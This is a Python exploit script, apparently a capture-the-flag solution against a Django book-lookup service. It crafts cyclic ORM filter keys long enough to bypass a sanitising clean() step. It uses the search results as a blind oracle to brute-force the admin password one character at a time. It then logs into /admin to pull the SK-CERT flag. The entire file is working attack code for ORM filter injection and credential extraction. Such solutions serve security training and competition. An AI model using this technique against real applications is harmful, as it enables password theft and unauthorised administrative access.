import re
import string

import requests

BASE_URL = "http://exp.cybergame.sk:7001"
LOOKUP_URL = f"{BASE_URL}/book_lookup"
ADMIN_URL = f"{BASE_URL}/admin"
CHARSET = string.ascii_letters + string.digits


def build_bypass_key(tail_parts, loops=7):
    """
    Build a valid cyclic ORM path with >=25 '__' separators so clean() raises
    and the original key is used by Django ORM.
    """
    parts = []
    for _ in range(loops):
        parts.extend(["reviews", "by_user", "review", "for_book"])
    parts.extend(tail_parts)
    key = "__".join(parts)
    if key.count("__") < 25:
        raise ValueError("Bypass key too short, clean() will still rewrite it")
    return key


def count_books(html):
    return html.count('class="book_card"')


def has_result(session, payload):
    r = session.post(LOOKUP_URL, data=payload, timeout=10)
    return count_books(r.text) > 0


def main():
    session = requests.Session()

    try:
        r = session.get(BASE_URL, timeout=10)
    except Exception as e:
        print(f"Connection error: {e}")
        raise SystemExit(1)
    print(f"Main page status: {r.status_code}")

    role_key = build_bypass_key(["reviews", "by_user", "role"])
    pw_key = build_bypass_key(["reviews", "by_user", "password", "startswith"])
    print(f"Role key '__' count: {role_key.count('__')}")
    print(f"Password key '__' count: {pw_key.count('__')}")

    oracle_payload = {role_key: "admin"}
    if not has_result(session, oracle_payload):
        print("Admin oracle check failed: no matching books for role=admin.")
        raise SystemExit(1)
    print("Admin oracle is working.")

    password = ""
    max_len = 64
    for i in range(max_len):
        found = False
        for ch in CHARSET:
            test_prefix = password + ch
            payload = {role_key: "admin", pw_key: test_prefix}
            if has_result(session, payload):
                password = test_prefix
                found = True
                print(f"[{i + 1:02d}] {password}")
                break
        if not found:
            break

    if not password:
        print("Password extraction failed.")
        raise SystemExit(1)
    print(f"Recovered admin password candidate: {password}")

    # Seed data uses username 'Admin' locally; try this first.
    resp = session.get(ADMIN_URL, auth=("Admin", password), timeout=10)
    print(f"/admin status: {resp.status_code}")
    print(resp.text.strip())

    match = re.search(r"SK-CERT\{[^}]+\}", resp.text)
    if match:
        print(f"\nFLAG: {match.group(0)}")
    elif resp.status_code == 401:
        print("Auth failed with username 'Admin'. Password may be incomplete.")
    else:
        print("Flag pattern not found in /admin response.")


if __name__ == "__main__":
    main()
